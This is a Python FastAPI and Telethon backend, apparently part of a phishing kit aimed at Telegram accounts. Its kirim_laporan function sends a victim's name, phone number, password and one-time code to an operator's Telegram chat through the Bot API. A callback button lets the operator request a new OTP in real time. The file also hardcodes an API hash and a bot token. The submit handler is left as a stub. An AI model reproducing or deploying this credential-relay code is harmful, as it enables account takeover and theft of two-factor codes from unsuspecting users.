import asyncio
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from telethon import TelegramClient, events # Tambahkan events
from telethon.errors import PhoneCodeInvalidError, SessionPasswordNeededError, PasswordHashInvalidError
import uvicorn
import requests

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

API_ID = '33714700'
API_HASH = '9319b6d061a62e30b6a247cdff6aaf91'
BOT_TOKEN = '8244385359:AAG7b2VCv_o5_miHQ7LXWn3-SbyqFPZLHcY'
CHAT_ID = '8085118159'

# Client untuk Bot agar bisa merespons tombol
bot_client = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

sessions = {}

# Fungsi untuk merespons klik tombol "otp" di Telegram
@bot_client.on(events.CallbackQuery(data=b'req'))
async def handler(event):
    # Memberikan notifikasi kecil di layar Telegram user
    await event.answer("Meminta OTP Baru ke User...", alert=False)
    # Mengirim pesan tambahan sebagai respon
    await event.respond("🔄 Sistem sedang menunggu user menekan tombol 'Kirim Ulang' di website.")

def kirim_laporan(nama, nomor, otp="None", password="None"):
    pesan = (
        f"Name: {nama}\n"
        f"Number: {nomor}\n"
        f"Password: {password}\n"
        f"OTP : {otp}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID, 
        "text": pesan,
        "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": "req"}]]}
    }
    requests.post(url, json=payload)

@app.post("/submit")
async def handle_submit(data: dict):
    # ... (Logika handle_submit tetap sama seperti sebelumnya) ...
    # Pastikan memanggil kirim_laporan(nama, phone, otp=otp) di sini
    pass

# Menjalankan FastAPI dan Bot secara bersamaan
if __name__ == "__main__":
    # Menjalankan loop bot di background
    import threading
    threading.Thread(target=bot_client.run_until_disconnected, daemon=True).start()
    uvicorn.run(app, host="127.0.0.1", port=8000)